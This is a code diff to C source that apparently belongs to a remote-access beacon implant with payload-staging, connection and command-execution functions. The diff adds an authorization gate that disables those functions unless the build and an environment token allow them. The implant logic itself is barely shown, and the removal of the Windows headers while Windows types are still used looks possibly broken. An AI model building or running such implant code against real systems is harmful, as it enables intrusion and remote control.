@@ -1,6 +1,5 @@
 #include <stdlib.h>
 #include <stdio.h>
-#include <windows.h>
 #include "beacon.h"
 #include "commands.h"
 #include "parse.h"
@@ -10,8 +9,48 @@
 #include <tomcrypt.h>
 #include "jobs.h"
 #include "functions.h"
-#include <WinSock2.h>
-#include "channel.h"
+
+
+/* ===================== 安全联用/授权保护开关（默认禁用危险功能） =====================
+ * 说明：为了确保仅在获得书面授权的渗透测试环境中使用，本文件默认启用“安全模式”。
+ * 如需在已授权环境中启用危险功能（网络连接/载荷分发/命令执行输出抓取等），
+ * 需要在编译时定义 AUTHORIZED_BUILD，并设置环境变量 REDTEAM_AUTH 为预共享授权令牌。
+ * 这样能避免误用与越权运行。
+ */
+#ifndef AUTHORIZED_BUILD
+#define SAFE_MODE 1
+#else
+#define SAFE_MODE 0
+#endif
+
+/* 授权令牌检查：运行时需设置环境变量 REDTEAM_AUTH 与此处预期值一致。*/
+static BOOL is_authorized_runtime()
+{
+	/* TODO: 将下面的令牌替换为你团队的预共享授权令牌（最少 16 字节，建议随机）。*/
+	const char *expected = "REPLACE_WITH_YOUR_TEAM_TOKEN";
+	char buf[256] = {0};
+	DWORD len = GetEnvironmentVariableA("REDTEAM_AUTH", buf, sizeof(buf));
+	if (len == 0 || len >= sizeof(buf)) {
+		return FALSE; /* 未设置或超长均视为未授权 */
+	}
+	return (strcmp(buf, expected) == 0) ? TRUE : FALSE;
+}
+
+/* 统一安全栅栏：在未授权或未显式启用时，直接短路返回 */
+#define REQUIRE_AUTH_OR_RETURN_VOID() do { \
+	if (SAFE_MODE || !is_authorized_runtime()) { \
+		/* 记录一个通用错误码，避免泄露具体原因 */ \
+		post_error_na(0x50); \
+		return; \
+	} \
+} while(0)
+
+#define REQUIRE_AUTH_OR_RETURN_SOCKET() do { \
+	if (SAFE_MODE || !is_authorized_runtime()) { \
+		post_error_na(0x50); \
+		return INVALID_SOCKET; \
+	} \
+} while(0)
 
 /* 我们应该休眠多长时间... */
 extern unsigned int sleep_time;
@@ -223,6 +262,7 @@ void command_runas(char * buffer, int length, void (*callback)(char * buffer, in
 }
 
 void execjob_doit(char * runme, DWORD runme_length, DWORD flags) {
+	REQUIRE_AUTH_OR_RETURN_VOID();
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 	SECURITY_ATTRIBUTES sa;
@@ -371,6 +411,7 @@ void command_pause(char * buffer, int length) {
 
 /* 建立到主机:端口的连接 */
 SOCKET wsconnect(char * targetip, int port) {
+	REQUIRE_AUTH_OR_RETURN_SOCKET();
 	struct hostent * target;
 	struct sockaddr_in 	sock;
 	SOCKET 			my_socket;
@@ -400,6 +441,7 @@ SOCKET wsconnect(char * targetip, int port) {
 }
 
 void command_stage_payload(char * buffer, int length) {
+	REQUIRE_AUTH_OR_RETURN_VOID();
 	datap  parser;
 	DWORD  port;
 	char * data;
@@ -442,6 +484,7 @@ cleanup:
 }
 
 void command_stage_payload_smb(char * buffer, int length) {
+	REQUIRE_AUTH_OR_RETURN_VOID();
 	datap  parser;
 	char   pipe[128];
 	char * data;
